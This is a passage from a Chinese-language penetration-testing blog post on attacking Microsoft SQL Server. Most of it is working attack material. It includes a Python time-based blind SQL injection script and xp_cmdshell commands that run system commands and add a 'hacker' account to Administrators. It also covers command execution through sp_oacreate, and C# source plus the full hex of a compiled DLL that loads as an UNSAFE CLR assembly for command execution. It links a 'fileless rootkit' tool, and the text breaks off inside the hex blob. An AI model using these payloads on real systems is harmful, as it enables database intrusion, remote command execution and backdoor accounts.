class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.244/index.aspx?user_id=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = url + <span class="string">&quot;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),%d,1)))&gt;%d WAITFOR DELAY &#x27;0:0:2&#x27;--&quot;</span> %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       data = &#123;</span></span><br><span class="line"><span class="string">       &quot;user_id&quot;: payload</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string">       res = requests.get(url=url, data=data)</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># m</span></span><br><span class="line"><span class="comment"># ma</span></span><br><span class="line"><span class="comment"># mas</span></span><br><span class="line"><span class="comment"># mast</span></span><br><span class="line"><span class="comment"># maste</span></span><br><span class="line"><span class="comment"># master</span></span><br></pre></td></tr></table></figure></p>
<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><p>xp_cmdshell默认在mssql2000中开启，在后续版本MSSQL2005中默认关闭，但仍然存在。利用它可以在数据库中执行系统命令，从而帮助我们进行提权等操作<br>条件:</p>
<ul>
<li>需要DBA权限</li>
<li>依赖xplog70.dll<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */</span></span><br><span class="line"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查看是否存在 xp_cmdshell，返回 1 则存在 */</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> master.dbo.sysobjects <span class="keyword">WHERE</span> xtype<span class="operator">=</span><span class="string">&#x27;x&#x27;</span> <span class="keyword">AND</span> name<span class="operator">=</span><span class="string">&#x27;xp_cmdshell&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*查看是否开启xp_cmdshell*/</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sys.configurations <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;xp_cmdshell&#x27;</span> <span class="keyword">OR</span> name<span class="operator">=</span><span class="string">&#x27;show advanced options&#x27;</span>;</span><br><span class="line"><span class="comment">/*查看SQL中是否启用了xp_cmdshell，如果Enable or disable command shell的值为0，表示未启用xp_cmdshell。*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 开启 xp_cmdshell */</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 关闭 xp_cmdshell */</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure>
一般命令:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;dir c:\&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;dir c:\&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;ipconfig/all&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;net user hacker Passw0rd /add&#x27;</span>,NO_OUTPUT</span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;net localgroup Administrators hacker /add&#x27;</span>,NO_OUTPUT</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="xp-cmdshell被删了如何攻击"><a href="#xp-cmdshell被删了如何攻击" class="headerlink" title="xp_cmdshell被删了如何攻击?"></a>xp_cmdshell被删了如何攻击?</h2><h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>Sql Server中的COM组件SP_OACREATE可以执行系统命令<br>利用<code>master.dbo.sysobjects</code>表来判断<code>SP_OACREATE</code>的状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104221302.png" alt="image.png"></p>
<p>上图显示存在改组件,也可以用<code>count(*)</code>函数来判断<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure><br>返回1即可<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104221414.png" alt="image.png"></p>
<p>利用EXEC启用<code>sp_oacreate</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure></p>
<p>执行命令:</p>
<p>无回显利用方式<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;d:\\1.txt&#x27;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104221724.png" alt="image.png"></p>
<h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件</p>
<p>流程： 利用Vistual Studio创建MSSQL数据库项目<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250107184007.png" alt="image.png"></p>
<p>选好位置后完成进入项目，在菜单的项目-》最下面的“项目名”属性<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250107184135.png" alt="image.png"></p>
<p>修改目标平台并创建sql文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250107184204.png" alt="image.png"></p>
<p>修改目标框架和权限级别<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250107184231.png" alt="image.png"></p>
<p>在解决方案资源管理器右键单击项目，添加-》新建项<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250107184316.png" alt="image.png"></p>
<p>写入代码<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"></span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void ExecCommand (string cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在此处放置代码</span><br><span class="line">        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);</span><br><span class="line">        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static string RunCommand(string filename,string arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        var process = new Process();</span><br><span class="line"></span><br><span class="line">        process.StartInfo.FileName = filename;</span><br><span class="line">        if (!string.IsNullOrEmpty(arguments))</span><br><span class="line">        &#123;</span><br><span class="line">            process.StartInfo.Arguments = arguments;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        process.StartInfo.CreateNoWindow = true;</span><br><span class="line">        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;</span><br><span class="line">        process.StartInfo.UseShellExecute = false;</span><br><span class="line"></span><br><span class="line">        process.StartInfo.RedirectStandardError = true;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        var stdOutput = new StringBuilder();</span><br><span class="line">        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);</span><br><span class="line">        string stdError = null;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            process.Start();</span><br><span class="line">            process.BeginOutputReadLine();</span><br><span class="line">            stdError = process.StandardError.ReadToEnd();</span><br><span class="line">            process.WaitForExit();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (process.ExitCode == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(stdOutput.ToString());</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var message = new StringBuilder();</span><br><span class="line"></span><br><span class="line">            if (!string.IsNullOrEmpty(stdError))</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(stdError);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (stdOutput.Length != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(&quot;Std output:&quot;);</span><br><span class="line">                message.AppendLine(stdOutput.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);</span><br><span class="line">        &#125;</span><br><span class="line">        return stdOutput.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>启用MSSQL CLR功能（默认关闭）<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure></p>
<p>将数据库标记为安全<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br></pre></td></tr></table></figure></p>
<p>利用SQL语句导入程序集,这个sql语句在项目目录的Debug目录有SQL文件，打开即可看到<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [Database1]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure></p>
<p>创建存储过程<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[ExecCommand]</span><br><span class="line">@cmd NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]</span><br><span class="line">go</span><br></pre></td></tr></table></figure><br>执行命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbo.ExecCommand &quot;whoami&quot;;</span><br></pre></td></tr></table></figure></p>
<h3 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h3><p>WarSQLKit是一个针对Mssql CLR进行利用的渗透工具，它存在以下两个版本。</p>
<ul>
<li>WarSQLKit<br>  WarSQLKit是完全版本，内置多种功能。</li>
<li>WarSQLKitMinimal<br>  WarSQLKitMinimal是精简版，只能执行命令。<br><a target="_blank" rel="noopener" href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a><br>步骤和上面操作一样：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [Database1] AUTHORIZATION [dbo]</span><br><span class="line"></span><br><span class="line">FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300011E7D670000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076322E302E35303732370000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C4